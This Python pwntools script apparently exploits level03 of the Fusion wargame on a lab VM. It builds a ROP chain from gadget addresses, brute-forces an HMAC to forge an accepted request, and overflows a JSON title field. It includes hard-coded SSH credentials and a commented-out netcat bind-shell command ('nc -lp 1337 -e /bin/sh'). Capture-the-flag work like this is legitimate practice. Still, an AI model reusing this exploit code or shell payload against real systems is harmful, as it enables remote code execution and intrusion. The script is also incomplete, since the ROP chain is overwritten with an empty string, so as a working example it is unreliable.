#!/usr/bin/python3

from pwn import *
import hmac
from hashlib import sha1
import json, random, string

IP = '192.168.12.131'
PORT = 20003
ENC = 'iso-8859-1'
EXE = 'level03'

LOCAL_IP = '192.168.12.129'
SERVER_IP = IP
SERVER_PORT = 9999

def sendFile(payload):
    s = ssh(host='192.168.12.131', user='fusion', password='godmode')
    s.upload_data(payload, '/tmp/payload')

def get_token():
    log.info('Init connection')
    global io 
    io = remote(IP, PORT)
    banner = io.recvS()
    token = banner.split('"')[1]
    log.success('Token: {}'.format(token))
    return token


'''
siuser@ubuntu:~/ctf/fusion/level03$ ropper -f ./level03 --search "pop"
0x08048bf0: pop ebx; ret;
'''
pop1 = 0x08048bf0
pop2 = 0x0804964e
pop3 = 0x0804964d

memcpy = 0x08048e60
post_blog_article = 0x08049f20 
gTitle = 0x0804be04
libc_start_main = 0x08048d80+2

elf = ELF(EXE)
libc = ELF('libc.so.6')
rop = ROP(elf)
#rop.raw(elf.got['write'])

rop.raw(memcpy)
rop.raw(post_blog_article)
rop.raw(gTitle)
rop.raw(libc_start_main)
rop.raw(0x4)

decoded_rop = rop.chain().decode(ENC)
decoded_rop = ''

pattern = 'A'*31
token = get_token()
contents = 'A'*4#'/'*400 + 'bin/nc.traditional -lp 1337 -e /bin/sh'

while(True):
    title = ''.join([random.choice(string.ascii_letters + string.digits) for n in range(100)])
    msg = json.dumps(
            {"tags":("A"), "title":title+'A'*27+'\\u1111'+pattern+decoded_rop, "contents":contents, "serverip":"{}:{}".format(SERVER_IP, SERVER_PORT)}, ensure_ascii=False)
    payload  = token + '\n' + msg
    hashed = hmac.new(bytearray(token, ENC), bytearray(payload, ENC), sha1)
    if (hashed.hexdigest().startswith('0000')):
        log.info("Hash: " + hashed.hexdigest())
        log.info("Sending to {}:{}".format(SERVER_IP, SERVER_PORT))
        #log.info("Payload: " + payload)
        break

io.send(payload)
l = remote(SERVER_IP, SERVER_PORT)
#l.wait_for_connection()
print(l.recv(timeout=1))

